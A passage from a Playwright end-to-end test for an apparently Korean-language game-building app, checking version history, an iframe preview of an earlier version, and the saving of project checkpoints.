  await expect(items.first()).toContainText("두 번째 버전을 게시했다");
  await items.last().getByRole("button", { name: "이 시점 보기" }).click();
  await expect(
    dialog
      .frameLocator('iframe[title="작품 미리보기"]')
      .getByRole("heading", { name: "첫 버전" }),
  ).toBeVisible();
  await page.reload();
  await page
    .locator(".project-list > div > button:first-child")
    .filter({ hasText: "나의 첫 클릭 게임" })
    .first()
    .click();
  await page.getByRole("button", { name: "여기까지 완성" }).click();
  await expect(dialog.locator(".checkpoint-list li")).toHaveCount(2);
});
